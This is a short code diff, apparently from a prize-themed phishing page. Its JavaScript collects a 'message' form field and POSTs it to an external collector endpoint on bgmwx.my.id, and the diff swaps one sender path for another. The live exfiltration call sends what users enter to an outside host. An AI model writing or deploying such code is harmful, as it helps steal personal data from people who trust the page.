@@ -29,7 +29,7 @@ function next() {
 	fd.append('message', message);
 	
 	fetch("https://bgmwx.my.id/senders/"
-        +"pnen-hadiah-wnd3r/send.php", {
+        +"rjk-ifhkwn/send.php", {
         method: 'POST',
         body: fd
       })
